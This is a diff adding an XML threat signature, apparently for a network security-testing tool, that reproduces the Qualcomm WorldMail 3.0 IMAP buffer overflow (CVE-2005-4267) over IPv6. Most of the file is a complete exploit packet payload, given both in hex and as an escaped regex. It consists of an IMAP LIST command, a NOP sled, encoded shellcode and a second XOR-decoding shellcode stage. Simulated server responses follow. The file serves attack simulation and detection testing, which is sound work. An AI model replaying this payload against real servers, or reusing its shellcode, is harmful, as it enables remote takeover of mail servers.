@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Eudora Qualcomm WorldMail IMAP Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat causes a buffer overflow in the IMAP daemon of WorldMail.  This is used to gain control of the server using this application.  IMAP typically listens on port 143. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="IMAP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Qualcomm"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Qualcomm_WorldMail"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Qualcomm_WorldMail_3.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://lists.grok.org.uk/pipermail/full-disclosure/2005-December/040389.html"/>
+    <CVEID display="true" value="CVE-2005-4267"/>
+    <bugtraqID display="true" value="15980"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="7370623f2a2a59439f14446ad4722f84"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value=""/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236797191"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X61\X30\X30\X31\X20\X4C\X49\X53\X54\X20\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\XEB\X03\X59\XEB\X05\XE8\XF8\XFF\XFF\XFF\X4F\X49\X49\X49\X49\X49\X49\X51\X5A\X56\X54\X58\X36\X33\X30\X56\X58\X34\X41\X30\X42\X36\X48\X48\X30\X42\X33\X30\X42\X43\X56\X58\X32\X42\X44\X42\X48\X34\X41\X32\X41\X44\X30\X41\X44\X54\X42\X44\X51\X42\X30\X41\X44\X41\X56\X58\X34\X5A\X38\X42\X44\X4A\X4F\X4D\X4E\X4F\X4C\X56\X4B\X4E\X4D\X54\X4A\X4E\X49\X4F\X4F\X4F\X4F\X4F\X4F\X4F\X42\X56\X4B\X38\X4E\X36\X46\X32\X46\X52\X4B\X58\X45\X54\X4E\X53\X4B\X38\X4E\X37\X45\X50\X4A\X47\X41\X30\X4F\X4E\X4B\X38\X4F\X34\X4A\X31\X4B\X48\X4F\X35\X42\X52\X41\X30\X4B\X4E\X49\X54\X4B\X48\X46\X33\X4B\X58\X41\X50\X50\X4E\X41\X43\X42\X4C\X49\X59\X4E\X4A\X46\X38\X42\X4C\X46\X57\X47\X30\X41\X4C\X4C\X4C\X4D\X50\X41\X30\X44\X4C\X4B\X4E\X46\X4F\X4B\X33\X46\X35\X46\X52\X4A\X32\X45\X37\X45\X4E\X4B\X48\X4F\X35\X46\X32\X41\X50\X4B\X4E\X48\X36\X4B\X38\X4E\X50\X4B\X34\X4B\X38\X4F\X55\X4E\X41\X41\X30\X4B\X4E\X43\X30\X4E\X32\X4B\X38\X49\X48\X4E\X36\X46\X32\X4E\X41\X41\X36\X43\X4C\X41\X53\X4B\X4D\X46\X56\X4B\X58\X43\X54\X42\X53\X4B\X48\X42\X34\X4E\X50\X4B\X58\X42\X37\X4E\X41\X4D\X4A\X4B\X58\X42\X44\X4A\X30\X50\X55\X4A\X46\X50\X38\X50\X44\X50\X50\X4E\X4E\X42\X35\X4F\X4F\X48\X4D\X48\X56\X43\X55\X48\X56\X4A\X46\X43\X53\X44\X53\X4A\X56\X47\X37\X43\X57\X44\X43\X4F\X45\X46\X45\X4F\X4F\X42\X4D\X4A\X56\X4B\X4C\X4D\X4E\X4E\X4F\X4B\X43\X42\X35\X4F\X4F\X48\X4D\X4F\X45\X49\X38\X45\X4E\X48\X36\X41\X38\X4D\X4E\X4A\X30\X44\X50\X45\X55\X4C\X36\X44\X30\X4F\X4F\X42\X4D\X4A\X56\X49\X4D\X49\X30\X45\X4F\X4D\X4A\X47\X55\X4F\X4F\X48\X4D\X43\X55\X43\X45\X43\X45\X43\X45\X43\X45\X43\X44\X43\X45\X43\X44\X43\X55\X4F\X4F\X42\X4D\X48\X36\X4A\X56\X41\X31\X4E\X55\X48\X46\X43\X45\X49\X48\X41\X4E\X45\X49\X4A\X46\X46\X4A\X4C\X51\X42\X57\X47\X4C\X47\X35\X4F\X4F\X48\X4D\X4C\X36\X42\X31\X41\X35\X45\X45\X4F\X4F\X42\X4D"/>
+    <Created value="1139462420" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="IMAPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$IMAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="61303031204C4953542090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090EB0359EB05E8F8FFFFFF4F494949494949515A5654583633305658344130423648483042333042435658324244424834413241443041445442445142304144415658345A3842444A4F4D4E4F4C564B4E4D544A4E494F4F4F4F4F4F4F42564B384E36463246524B5845544E534B384E3745504A4741304F4E4B384F344A314B484F35425241304B4E49544B4846334B584150504E4143424C49594E4A4638424C46574730414C4C4C4D504130444C4B4E464F4B33463546524A324537454E4B484F35463241504B4E48364B384E504B344B384F554E4141304B4E43304E324B3849484E3646324E414136434C41534B4D46564B58435442534B4842344E504B5842374E414D4A4B5842444A3050554A465038504450504E4E42354F4F484D4856435548564A46435344534A564737435744434F4546454F4F424D4A564B4C4D4E4E4F4B4342354F4F484D4F454938454E483641384D4E4A30445045554C3644304F4F424D4A56494D4930454F4D4A47554F4F484D4355434543454345434543444345434443554F4F424D48364A5641314E55484643454948414E45494A46464A4C514257474C47354F4F484D4C364231413545454F4F424D4A36464A4D4A5042494E47454F4F484D434545354F4F424D4A36454E49544848495447554F4F484D42354645465545454F4F424D43494A46474E4937484C493747354F4F484D45554F4F424D48364C56463648464A3643564D564958454E4C564245493549324E4C4938474E4C3646544938444E4133424C434F4C4A504F44444D52504F44344E3243594D584C574A534B4A4B4A4B4A4A364457504F434B48514F4F455746444F4F484D4B55475544554155414541354C46413041354145455541554F4F424D4A564D4A494D4530504C43454F4F484D4C364F4F4F4F47334F4F424D4B3847554E4F4358464C46364F4F484D44454F4F424D4A46424F4C5846304F3543354F4F484D4F4F424D5AEB0606EBF7CCE17790909090909090906A0559D9EED97424F45B8173132F77284B83EBFCE2F4F699F13F0B8371CBEE7DB8B5E289E5B5E288C94B7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D7D0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="0,1,2,3">
+    <Output index="A" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2a204f4b205b4341504142494c49545920494d4150347265763120554944504c5553204348494c4452454e204e414d455350414345205448524541443d4f5244455245445355424a454354205448524541443d5245464552454e43455320534f52542051554f54412049444c452041434c2041434c323d554e494f4e205354415254544c535d0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="613031204f4b2055736572206c6f6767656420696e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="613032204f4b204c49535420636f6d706c657465640d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2a20464c4147532028244d444e53656e74204a756e6b204e6f6e4a756e6b2024466f7277617264656420244c6162656c3120447261667420416e73776572656420466c61676765642044656c65746564205365656e20526563656e74290d0a2a204f4b205b5045524d414e454e54464c4147532028244d444e53656e74204a756e6b204e6f6e4a756e6b2024466f7277617264656420244c6162656c31202a207261667420416e73776572656420466c61676765642044656c65746564205365656e295d204c696d697465640d0a2a2035393837204558495354530d0a2a203020524543454e540d0a2a204f4b205b55494456414c494449545920313133333931323636365d204f6b0d0a2a204f4b205b4d5952494748545320616364696c7273775d2041434c0d0a613033204f4b205b524541442d57524954455d204f6b0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
